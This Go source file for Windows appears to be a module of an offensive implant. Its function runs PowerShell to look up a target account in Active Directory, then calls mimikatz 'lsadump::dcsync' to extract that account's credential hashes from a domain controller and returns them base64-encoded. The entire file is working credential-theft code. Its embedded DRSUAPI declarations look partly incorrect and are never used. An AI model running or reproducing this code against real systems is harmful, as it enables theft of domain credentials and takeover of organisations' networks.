//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"fmt"
	"strings"
)

func dcsyncMachineAccount(domain, targetUser, dcIP string) ([]byte, error) {
	if domain == "" || targetUser == "" {
		return nil, fmt.Errorf("usage: dcsyncMachineAccount(domain, targetUser, dcIP)")
	}

	dcFlag := ""
	if dcIP != "" {
		dcFlag = fmt.Sprintf(" /dc:%s", dcIP)
	}

	psCmd := fmt.Sprintf(`
$domain = "%s"
$targetUser = "%s"
$dcIP = "%s"

try {
	$DRSUAPI = @"
using System;
using System.Runtime.InteropServices;

public class DRSUAPI {
	[DllImport("ntdll.dll", SetLastError=true)]
	public static extern int RtlNtStatusToDosError(int Status);

	[DllImport("DRSUAPI.dll", SetLastError=true, CharSet=CharSet.Unicode)]
	public static extern uint DsBindWithCred(
		string dcHostname,
		string dnsDomainName,
		IntPtr authIdentity,
		out IntPtr bindHandle
	);

	[DllImport("DRSUAPI.dll", SetLastError=true)]
	public static extern uint DsCrackNames(
		IntPtr bindHandle,
		uint flags,
		uint formatOffered,
		uint formatDesired,
		uint cNames,
		string[] rpNames,
		out IntPtr ppResult
	);
}
"@

	Add-Type -TypeDefinition $DRSUAPI -ErrorAction SilentlyContinue

	$searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]"LDAP://$domain")
	$searcher.Filter = "(&(objectClass=user)(sAMAccountName=$targetUser))"
	$searcher.PropertiesToLoad.AddRange(@("sAMAccountName","objectSid","dNSType","dNSRecord","msDS-KeyVersionNumber"))
	$result = $searcher.FindOne()

	if ($result -ne $null) {
		$props = $result.Properties
		Write-Output "[+] Found target: $targetUser"
		Write-Output "[+] ObjectSID: $([System.BitConverter]::ToString($props.objectsid[0]))"

		$mimikatzCmd = "lsadump::dcsync /domain:$domain /user:$targetUser$dcFlag"
		Write-Output "[*] Run via mimikatz: $mimikatzCmd"
	} else {
		Write-Output "[-] Target user $targetUser not found in $domain"
	}
} catch {
	Write-Error "DCSync machine account failed: $_"
}
`, domain, targetUser, dcIP)

	rawOut, err := runShell(psCmd, "powershell.exe")
	if err != nil {
		return nil, fmt.Errorf("dcsync machine pre-check failed: %w\nOutput: %s", err, rawOut)
	}
	_ = rawOut

	mimikatzCmd := fmt.Sprintf(
		"lsadump::dcsync /domain:%s /user:%s%s",
		domain, targetUser, dcFlag,
	)

	result, err := runMimikatz(mimikatzCmd, "")
	if err != nil {
		return nil, fmt.Errorf("dcsync machine account via mimikatz failed: %w\nOutput: %s", err, result)
	}

	resultLines := strings.TrimSpace(result)
	return []byte(base64.StdEncoding.EncodeToString([]byte(resultLines))), nil
}
